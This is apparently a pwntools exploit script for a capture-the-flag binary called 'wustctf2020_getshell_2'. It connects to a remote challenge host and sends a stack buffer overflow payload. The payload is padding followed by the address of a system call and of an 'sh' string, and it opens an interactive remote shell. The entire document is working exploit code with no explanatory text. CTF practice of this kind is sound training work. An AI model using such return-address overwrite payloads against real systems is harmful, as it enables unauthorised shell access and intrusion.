from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10256)
elf = ELF('./wustctf2020_getshell_2')
call_system = 0x8048529
sh_addr = 0x8048670
payload = b'a'*(0x18+0x4) + p32(call_system) + p32(sh_addr)
io.sendline(payload)
io.interactive()